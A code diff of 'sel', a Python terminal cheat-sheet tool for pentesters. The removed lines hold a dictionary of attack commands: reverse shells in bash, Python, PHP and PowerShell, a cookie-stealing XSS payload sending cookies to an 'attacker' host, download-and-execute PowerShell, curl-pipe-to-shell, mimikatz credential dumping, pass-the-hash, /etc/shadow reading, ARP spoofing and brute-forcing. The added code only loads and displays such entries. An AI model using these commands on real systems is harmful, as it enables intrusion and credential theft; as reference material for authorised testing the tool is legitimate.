@@ -1,391 +1,289 @@
 #!/usr/bin/env python3
-# ============================================
-#   SELWANISM - Personal Pentesting Assistant
-#   Author: Salah Eddin Essbihi
-#   Version: 2.0
-# ============================================
+"""
+sel - a pentesting command reference.
 
+I built this because I was tired of googling the same nmap flags
+every day. It's a quick lookup tool that stays in the terminal.
+
+Usage:
+    sel                  interactive mode
+    sel <tool>           show commands for a tool
+    sel -l               list every tool
+    sel -s <query>       search tools by name/title/tag
+    sel -h               show help
+"""
+
+import json
 import os
 import sys
+from pathlib import Path
+from typing import Dict, List
 
-# ====== الألوان ======
-RED = '\033[91m'
-GREEN = '\033[92m'
-YELLOW = '\033[93m'
-CYAN = '\033[96m'
-BOLD = '\033[1m'
-RESET = '\033[0m'
 
-# ====== قاعدة البيانات ======
-TOOLS = {
-    "nmap": {
-        "title": "Nmap - Network Scanner",
-        "desc": "Discover hosts and services on a network.",
-        "steps": [
-            ("Quick scan", "nmap -sV <IP>"),
-            ("Full TCP scan", "nmap -sV -sC -p- -T4 <IP>"),
-            ("UDP scan (top 100)", "nmap -sU --top-ports 100 <IP>"),
-            ("OS detection", "nmap -O <IP>"),
-            ("Save output", "nmap -sV -oN scan.txt <IP>"),
-            ("Aggressive scan", "nmap -A -T4 <IP>"),
-        ],
-    },
-    "arp_spoofing": {
-        "title": "ARP Spoofing / MITM",
-        "desc": "Intercept traffic between a victim and the gateway.",
-        "steps": [
-            ("Enable IP forwarding", "echo 1 > /proc/sys/net/ipv4/ip_forward"),
-            ("Start bettercap", "sudo bettercap -iface eth0"),
-            ("Set target", "set arp.spoof.targets <VICTIM_IP>"),
-            ("Enable ARP spoof", "arp.spoof on"),
-            ("Enable sniffing", "set net.sniff on"),
-            ("Capture with Wireshark", "sudo wireshark"),
-        ],
-    },
-    "sql_injection": {
-        "title": "SQL Injection",
-        "desc": "Test and exploit SQL injection vulnerabilities.",
-        "steps": [
-            ("Manual test", "' OR 1=1--"),
-            ("Automate with sqlmap", "sqlmap -u 'http://target/page?id=1' --batch"),
-            ("List databases", "sqlmap -u '<URL>' --dbs"),
-            ("List tables", "sqlmap -u '<URL>' -D <DB> --tables"),
-            ("Dump data", "sqlmap -u '<URL>' -D <DB> -T <TABLE> --dump"),
-            ("Get shell", "sqlmap -u '<URL>' --os-shell"),
-        ],
-    },
-    "xss": {
-        "title": "Cross-Site Scripting (XSS)",
-        "desc": "Test for reflected, stored, and DOM-based XSS.",
-        "steps": [
-            ("Basic payload", "<script>alert(1)</script>"),
-            ("Image payload", "<img src=x onerror=alert(1)>"),
-            ("Cookie stealer", "<script>fetch('http://attacker/?c='+document.cookie)</script>"),
-            ("Use Burp Suite", "Intercept request -> Modify parameter -> Forward"),
-            ("DOM XSS test", "#<img src=x onerror=alert(1)>"),
-        ],
-    },
-    "idor": {
-        "title": "Insecure Direct Object Reference (IDOR)",
-        "desc": "Access other users' data by changing IDs.",
-        "steps": [
-            ("Find parameter", "Example: /profile?id=5"),
-            ("Change ID", "Try /profile?id=1 or /profile?id=2"),
-            ("Use Burp Intruder", "Send to Intruder -> Sniper -> Numbers 1-100"),
-            ("Check API endpoints", "/api/user/1, /api/user/2, ..."),
-        ],
-    },
-    "linux_privesc": {
-        "title": "Linux Privilege Escalation",
-        "desc": "Escalate from a normal user to root.",
-        "steps": [
-            ("Check sudo rights", "sudo -l"),
-            ("Find SUID binaries", "find / -perm -4000 -type f 2>/dev/null"),
-            ("Check cron jobs", "cat /etc/crontab; ls -la /etc/cron*"),
-            ("Kernel version", "uname -a"),
-            ("Search exploits", "searchsploit linux kernel <version>"),
-            ("LinPEAS", "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"),
-        ],
-    },
-    "windows_privesc": {
-        "title": "Windows Privilege Escalation",
-        "desc": "Escalate privileges on a Windows machine.",
-        "steps": [
-            ("Check whoami", "whoami /priv"),
-            ("System info", "systeminfo"),
-            ("Find unquoted service paths", "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\\\"\""),
-            ("Check scheduled tasks", "schtasks /query /fo LIST /v"),
-            ("WinPEAS", "Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -OutFile winPEAS.exe; .\\winPEAS.exe"),
-        ],
-    },
-    "reverse_shell": {
-        "title": "Reverse Shell",
-        "desc": "Get a reverse shell from a target.",
-        "steps": [
-            ("Start listener", "nc -lvnp 4444"),
-            ("Bash shell", "bash -i >& /dev/tcp/<IP>/4444 0>&1"),
-            ("Python shell", "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<IP>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
-            ("PHP shell", "php -r '$sock=fsockopen(\"<IP>\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
-            ("Upgrade TTY", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"),
-            ("Windows PowerShell", "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""),
-        ],
-    },
-    "hash_cracking": {
-        "title": "Hash Cracking",
-        "desc": "Crack password hashes with Hashcat or John.",
-        "steps": [
-            ("Identify hash", "hash-identifier"),
-            ("Hashcat MD5", "hashcat -m 0 hash.txt rockyou.txt"),
-            ("Hashcat SHA1", "hashcat -m 100 hash.txt rockyou.txt"),
-            ("John the Ripper", "john --wordlist=rockyou.txt hash.txt"),
-            ("Show cracked", "hashcat -m 0 hash.txt --show"),
-        ],
-    },
-    "wifi_hacking": {
-        "title": "WiFi Hacking",
-        "desc": "Capture and crack WPA2 handshakes.",
-        "steps": [
-            ("Enable monitor mode", "sudo airmon-ng start wlan0"),
-            ("Scan networks", "sudo airodump-ng wlan0mon"),
-            ("Capture handshake", "sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon"),
-            ("Deauth attack", "sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon"),
-            ("Crack handshake", "aircrack-ng -w rockyou.txt capture-01.cap"),
-        ],
-    },
-    "osint": {
-        "title": "Open Source Intelligence (OSINT)",
-        "desc": "Gather information from public sources.",
-        "steps": [
-            ("Google Dorking", "site:target.com filetype:pdf"),
-            ("theHarvester", "theHarvester -d target.com -b google"),
-            ("Sherlock", "sherlock username"),
-            ("ExifTool", "exiftool image.jpg"),
-            ("WHOIS", "whois target.com"),
-            ("DNS enumeration", "dnsrecon -d target.com"),
-        ],
-    },
-    "hydra": {
-        "title": "Hydra - Password Brute-forcer",
-        "desc": "Brute-force login credentials for various protocols.",
-        "steps": [
-            ("SSH", "hydra -l <user> -P rockyou.txt ssh://<IP>"),
-            ("FTP", "hydra -l <user> -P rockyou.txt ftp://<IP>"),
-            ("HTTP POST", "hydra -l <user> -P rockyou.txt <IP> http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\""),
-            ("RDP", "hydra -l <user> -P rockyou.txt rdp://<IP>"),
-        ],
-    },
-    "john": {
-        "title": "John the Ripper",
-        "desc": "Password cracker.",
-        "steps": [
-            ("Basic", "john hash.txt"),
-            ("Wordlist", "john --wordlist=rockyou.txt hash.txt"),
-            ("Show", "john --show hash.txt"),
-            ("Unshadow", "unshadow /etc/passwd /etc/shadow > combined.txt"),
-        ],
-    },
-    "metasploit": {
-        "title": "Metasploit Framework",
-        "desc": "Exploit development and execution.",
-        "steps": [
-            ("Start", "msfconsole"),
-            ("Search", "search <exploit>"),
-            ("Use", "use <module>"),
-            ("Show options", "show options"),
-            ("Set RHOSTS", "set RHOSTS <IP>"),
-            ("Set LHOST", "set LHOST <IP>"),
-            ("Run", "exploit"),
-        ],
-    },
-    "burp_suite": {
-        "title": "Burp Suite",
-        "desc": "Web application security testing.",
-        "steps": [
-            ("Start Burp", "burpsuite"),
-            ("Configure proxy", "Set browser proxy to 127.0.0.1:8080"),
-            ("Intercept", "Proxy -> Intercept is on"),
-            ("Send to Repeater", "Right-click -> Send to Repeater"),
-            ("Send to Intruder", "Right-click -> Send to Intruder"),
-        ],
-    },
-    "wireshark": {
-        "title": "Wireshark",
-        "desc": "Network protocol analyzer.",
-        "steps": [
-            ("Start", "sudo wireshark"),
-            ("Capture filter", "tcp port 80"),
-            ("Display filter", "http.request"),
-            ("Follow stream", "Right-click packet -> Follow -> TCP Stream"),
-        ],
-    },
-    "gobuster": {
-        "title": "Gobuster",
-        "desc": "Directory/file brute-forcing.",
-        "steps": [
-            ("Basic dir", "gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt"),
-            ("With extensions", "gobuster dir -u http://<IP> -w list.txt -x php,html,txt"),
-            ("DNS subdomain", "gobuster dns -d target.com -w subdomains.txt"),
-        ],
-    },
-    "nikto": {
-        "title": "Nikto",
-        "desc": "Web server scanner.",
-        "steps": [
-            ("Basic", "nikto -h http://<IP>"),
-            ("With SSL", "nikto -h https://<IP> -ssl"),
-        ],
-    },
-    "wpscan": {
-        "title": "WPScan",
-        "desc": "WordPress vulnerability scanner.",
-        "steps": [
-            ("Basic", "wpscan --url http://<IP>"),
-            ("Enumerate users", "wpscan --url http://<IP> -e u"),
-            ("Enumerate plugins", "wpscan --url http://<IP> -e ap"),
-            ("Password attack", "wpscan --url http://<IP> -U users.txt -P rockyou.txt"),
-        ],
-    },
-    "enum4linux": {
-        "title": "Enum4linux",
-        "desc": "Enumerate Windows/Samba shares.",
-        "steps": [
-            ("Basic", "enum4linux -a <IP>"),
-            ("Shares", "enum4linux -S <IP>"),
-            ("Users", "enum4linux -U <IP>"),
-        ],
-    },
-    "smbclient": {
-        "title": "SMBClient",
-        "desc": "Access SMB shares.",
-        "steps": [
-            ("List shares", "smbclient -L //<IP> -N"),
-            ("Connect", "smbclient //<IP>/share -N"),
-            ("Download file", "get filename"),
-            ("Upload file", "put filename"),
-        ],
-    },
-    "bloodhound": {
-        "title": "BloodHound",
-        "desc": "Active Directory enumeration.",
-        "steps": [
-            ("Start neo4j", "sudo neo4j console"),
-            ("Start bloodhound", "bloodhound"),
-            ("Collect data", "SharpHound.exe -c All"),
-            ("Import data", "Drag and drop the zip into BloodHound"),
-        ],
-    },
-    "mimikatz": {
-        "title": "Mimikatz",
-        "desc": "Extract credentials from Windows memory.",
-        "steps": [
-            ("Run", "mimikatz.exe"),
-            ("Dump creds", "sekurlsa::logonpasswords"),
-            ("DCSync", "lsadump::dcsync /domain:domain.local /user:Administrator"),
-            ("Pass-the-Hash", "sekurlsa::pth /user:Administrator /ntlm:<hash> /domain:domain.local"),
-        ],
-    },
-    "powershell": {
-        "title": "PowerShell",
-        "desc": "Windows command-line and scripting.",
-        "steps": [
-            ("Bypass execution policy", "powershell -Exec Bypass"),
-            ("Download file", "Invoke-WebRequest -Uri http://<IP>/file -OutFile file"),
-            ("Run script", "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')"),
-            ("Reverse shell", "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<IP>',4444);...\""),
-        ],
-    },
-}
+# -----------------------------------------------------------------------------
+# Paths
+# -----------------------------------------------------------------------------
+SCRIPT_DIR = Path(__file__).resolve().parent
+DATA_FILE = SCRIPT_DIR / "tools.json"
 
-# ====== الشعار ======
-def banner():
-    os.system('clear')
-    print(f"{RED}{BOLD}")
-    print("  ███████╗███████╗██╗     ██╗    ██╗ █████╗ ███╗   ██╗██╗███████╗███╗   ███╗")
-    print("  ██╔════╝██╔════╝██║     ██║    ██║██╔══██╗████╗  ██║██║██╔════╝████╗ ████║")
-    print("  ███████╗█████╗  ██║     ██║ █╗ ██║███████║██╔██╗ ██║██║███████╗██╔████╔██║")
-    print("  ╚════██║██╔══╝  ██║     ██║███╗██║██╔══██║██║╚██╗██║██║╚════██║██║╚██╔╝██║")
-    print("  ███████║███████╗███████╗╚███╔███╔╝██║  ██║██║ ╚████║██║███████║██║ ╚═╝ ██║")
-    print("  ╚══════╝╚══════╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚═╝     ╚═╝")
-    print(f"{RESET}")
-    print(f"  {CYAN}Personal Pentesting Assistant{RESET}")
-    print(f"  {YELLOW}Type 'sel <keyword>' to search | '-h' for help | 'exit' to quit{RESET}\n")
 
-# ====== عرض أداة ======
-def show_tool(name):
-    if name not in TOOLS:
-        return False
-    tool = TOOLS[name]
-    print(f"\n{GREEN}{BOLD}=== {tool['title']} ==={RESET}")
-    print(f"{CYAN}{tool['desc']}{RESET}\n")
-    for i, (label, cmd) in enumerate(tool["steps"], 1):
-        print(f"  {YELLOW}[{i}]{RESET} {BOLD}{label}{RESET}")
-        print(f"      {GREEN}$ {cmd}{RESET}")
+# -----------------------------------------------------------------------------
+# Colors
+# -----------------------------------------------------------------------------
+class C:
+    RED = "\033[91m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    CYAN = "\033[96m"
+    BOLD = "\033[1m"
+    DIM = "\033[2m"
+    RESET = "\033[0m"
+
+
+# -----------------------------------------------------------------------------
+# Banner
+# -----------------------------------------------------------------------------
+BANNER = r"""
+   _____ ______ _      __          _   _  _____  _____  __  __
+  / ____|  ____| |     \ \        / / | |/ __ \|  __ \|  \/  |
+ | (___ | |__  | |      \ \  /\  / /| | | |  | | |__) | \  / |
+  \___ \|  __| | |       \ \/  \/ / | | | |  | |  _  /| |\/| |
+  ____) | |____| |____    \  /\  /  | | | |__| | | \ \| |  | |
+ |_____/|______|______|    \/  \/   |_| |\____/|_|  \_\_|  |_|
+"""
+
+
+# -----------------------------------------------------------------------------
+# Data
+# -----------------------------------------------------------------------------
+def load_tools() -> Dict[str, dict]:
+    if not DATA_FILE.exists():
+        print(f"{C.RED}[!] tools.json not found: {DATA_FILE}{C.RESET}")
+        sys.exit(1)
+
+    try:
+        with DATA_FILE.open("r", encoding="utf-8") as f:
+            return json.load(f)
+    except json.JSONDecodeError as exc:
+        print(f"{C.RED}[!] tools.json is invalid: {exc}{C.RESET}")
+        sys.exit(1)
+
+
+# -----------------------------------------------------------------------------
+# Display
+# -----------------------------------------------------------------------------
+def clear_screen() -> None:
+    os.system("cls" if os.name == "nt" else "clear")
+
+
+def show_banner() -> None:
+    clear_screen()
+    print(f"{C.RED}{BANNER}{C.RESET}")
+    print(f"  {C.DIM}pentesting command reference{C.RESET}\n")
+
+
+def show_tool(name: str, tool: dict) -> None:
     print()
-    return True
+    print(f"  {C.GREEN}{C.BOLD}{tool['title']}{C.RESET}")
+    print(f"  {C.DIM}{'-' * len(tool['title'])}{C.RESET}")
+    print()
 
-# ====== البحث ======
-def search_and_show(query):
-    query = query.lower().strip()
-    # If exact key
-    if query in TOOLS:
-        show_tool(query)
-        return
-    # Search in keys and titles
+    for index, step in enumerate(tool["steps"], start=1):
+        label, command = step
+        print(f"  {C.YELLOW}[{index}]{C.RESET} {label}")
+        print(f"      {C.CYAN}$ {command}{C.RESET}")
+
+    print()
+
+
+def show_list(tools: Dict[str, dict]) -> None:
+    print(f"\n  {C.BOLD}Available tools ({len(tools)}):{C.RESET}\n")
+
+    current_letter = ""
+    for name in sorted(tools.keys()):
+        letter = name[0].upper()
+        if letter != current_letter:
+            print(f"  {C.BOLD}-- {letter} --{C.RESET}")
+            current_letter = letter
+
+        title = tools[name]["title"]
+        print(f"    {C.CYAN}{name:<22}{C.RESET} {C.DIM}{title}{C.RESET}")
+
+    print()
+
+
+# -----------------------------------------------------------------------------
+# Search
+# -----------------------------------------------------------------------------
+def search(query: str, tools: Dict[str, dict]) -> List[str]:
+    q = query.lower()
     matches = []
-    for key, tool in TOOLS.items():
-        if query in key.lower() or query in tool["title"].lower() or query in tool["desc"].lower():
-            matches.append(key)
-    if not matches:
-        print(f"{RED}[!] No results for '{query}'{RESET}")
-        print(f"{YELLOW}[*] Try 'sel list' to see all available tools.{RESET}\n")
-        return
-    if len(matches) == 1:
-        show_tool(matches[0])
-    else:
-        print(f"{GREEN}[+] Found {len(matches)} results for '{query}':{RESET}")
-        for m in matches:
-            print(f"    - {CYAN}{m}{RESET} ({TOOLS[m]['title']})")
-        print(f"\n{YELLOW}[*] Type 'sel <name>' to view a specific tool.{RESET}\n")
 
-# ====== قائمة الأدوات ======
-def list_tools():
-    print(f"\n{GREEN}{BOLD}Available Tools & Attacks:{RESET}")
-    for k, v in TOOLS.items():
-        print(f"  {YELLOW}{k:<20}{RESET} - {v['title']}")
-    print()
+    for name, tool in tools.items():
+        if q in name.lower():
+            matches.append(name)
+            continue
+        if q in tool["title"].lower():
+            matches.append(name)
+            continue
+        if any(q in tag.lower() for tag in tool.get("tags", [])):
+            matches.append(name)
 
-# ====== المساعدة ======
-def help_menu():
-    print(f"\n{GREEN}{BOLD}SELWANISM - Help{RESET}")
-    print(f"{CYAN}Usage:{RESET}")
-    print(f"  sel <keyword>    Search for a tool or attack (e.g., sel arp spoofing)")
-    print(f"  sel list         Show all available tools")
-    print(f"  -h, --help       Show this help menu")
-    print(f"  exit             Quit the tool")
-    print(f"\n{CYAN}Examples:{RESET}")
-    print(f"  sel nmap         Show Nmap commands")
-    print(f"  sel sql          Show SQL Injection steps")
-    print(f"  sel arp          Show ARP Spoofing / MITM steps")
-    print(f"  sel privesc      Show privilege escalation techniques")
-    print(f"\n{CYAN}Search Tips:{RESET}")
-    print(f"  - You can use partial words (e.g., 'sel sql' matches 'sql_injection')")
-    print(f"  - The search looks in tool names, titles, and descriptions")
-    print(f"\n{CYAN}About:{RESET}")
-    print(f"  Selwanism is a personal pentesting assistant.")
-    print(f"  It provides ready-to-use commands and step-by-step guides.")
-    print(f"  Author: Salah Eddin Essbihi")
-    print()
+    return matches
 
-# ====== الواجهة الرئيسية ======
-def main():
-    banner()
+
+# -----------------------------------------------------------------------------
+# Help
+# -----------------------------------------------------------------------------
+def show_help() -> None:
+    print(f"""
+{C.BOLD}sel - pentesting command reference{C.RESET}
+
+{C.BOLD}USAGE:{C.RESET}
+    sel                  interactive mode
+    sel <tool>           show commands for a tool
+    sel -l               list every tool
+    sel -s <query>       search by name, title, or tag
+    sel -h               show this help
+
+{C.BOLD}EXAMPLES:{C.RESET}
+    sel nmap             # nmap cheatsheet
+    sel sqlmap           # sqlmap cheatsheet
+    sel -s recon         # everything tagged 'recon'
+    sel -s privesc       # everything for privilege escalation
+
+{C.BOLD}ABOUT:{C.RESET}
+    Built by Salah Eddin Essbihi.
+    Repo: https://github.com/salahreds06-selawy/selwanism
+""")
+
+
+# -----------------------------------------------------------------------------
+# Interactive mode
+# -----------------------------------------------------------------------------
+def interactive(tools: Dict[str, dict]) -> None:
+    show_banner()
+    print(f"  {C.DIM}Type a tool name, '-l' to list, '-s <x>' to search, 'exit' to quit.{C.RESET}\n")
+
     while True:
         try:
-            user_input = input(f"{RED}sel{RESET} > ").strip()
+            raw = input(f"{C.RED}sel{C.RESET} > ").strip()
         except (KeyboardInterrupt, EOFError):
-            print(f"\n{CYAN}Goodbye.{RESET}")
-            sys.exit(0)
+            print(f"\n{C.CYAN}bye{C.RESET}")
+            return
 
-        if not user_input:
+        if not raw:
             continue
 
-        if user_input.lower() in ['exit', 'quit']:
-            print(f"{CYAN}Goodbye.{RESET}")
-            break
-        elif user_input.lower() in ['-h', '--help', 'help']:
-            help_menu()
-        elif user_input.lower().startswith('sel '):
-            query = user_input[4:].strip()
-            if query.lower() in ['list', 'all']:
-                list_tools()
+        lowered = raw.lower()
+
+        if lowered in ("exit", "quit", "q"):
+            print(f"{C.CYAN}bye{C.RESET}")
+            return
+
+        if lowered in ("-h", "--help", "help"):
+            show_help()
+            continue
+
+        if lowered in ("-l", "--list", "list"):
+            show_list(tools)
+            continue
+
+        if lowered.startswith("-s ") or lowered.startswith("search "):
+            query = raw.split(" ", 1)[1]
+            results = search(query, tools)
+
+            if not results:
+                print(f"{C.RED}  no matches for '{query}'{C.RESET}\n")
+            elif len(results) == 1:
+                show_tool(results[0], tools[results[0]])
             else:
-                search_and_show(query)
+                print(f"\n  {C.GREEN}{len(results)} matches:{C.RESET}")
+                for name in results:
+                    print(f"    {C.CYAN}{name}{C.RESET}")
+                print()
+            continue
+
+        if lowered in tools:
+            show_tool(lowered, tools[lowered])
+            continue
+
+        results = search(raw, tools)
+
+        if len(results) == 1:
+            show_tool(results[0], tools[results[0]])
+        elif len(results) > 1:
+            print(f"\n  {C.GREEN}did you mean:{C.RESET}")
+            for name in results[:10]:
+                print(f"    {C.CYAN}{name}{C.RESET}")
+            print()
         else:
-            # If user types something without 'sel', we can also try to search it directly
-            # But to strictly follow, we'll show a message.
-            # However, for convenience, we can also search it.
-            # Let's just search it.
-            search_and_show(user_input)
+            print(f"{C.RED}  '{raw}' not found. Try -l to list all.{C.RESET}\n")
+
+
+# -----------------------------------------------------------------------------
+# Entry point
+# -----------------------------------------------------------------------------
+def main() -> int:
+    tools = load_tools()
+    args = sys.argv[1:]
+
+    if not args:
+        interactive(tools)
+        return 0
+
+    if len(args) == 1:
+        arg = args[0]
+        lowered = arg.lower()
+
+        if lowered in ("-h", "--help", "help"):
+            show_help()
+            return 0
+
+        if lowered in ("-l", "--list", "list"):
+            show_list(tools)
+            return 0
+
+        if lowered in tools:
+            show_tool(lowered, tools[lowered])
+            return 0
+
+        results = search(arg, tools)
+
+        if len(results) == 1:
+            show_tool(results[0], tools[results[0]])
+            return 0
+
+        if results:
+            print(f"\n  {C.GREEN}did you mean:{C.RESET}")
+            for name in results[:10]:
+                print(f"    {C.CYAN}{name}{C.RESET}")
+            print()
+            return 0
+
+        print(f"{C.RED}  '{arg}' not found. Run 'sel -l' to see all.{C.RESET}")
+        return 1
+
+    if args[0] in ("-s", "--search", "search"):
+        query = " ".join(args[1:])
+        results = search(query, tools)
+
+        if not results:
+            print(f"{C.RED}  no matches for '{query}'{C.RESET}")
+            return 1
+
+        if len(results) == 1:
+            show_tool(results[0], tools[results[0]])
+        else:
+            print(f"\n  {C.GREEN}{len(results)} matches:{C.RESET}")
+            for name in results:
+                print(f"    {C.CYAN}{name}{C.RESET}")
+            print()
+        return 0
+
+    show_help()
+    return 1
+
 
 if __name__ == "__main__":
-    main()
+    sys.exit(main())
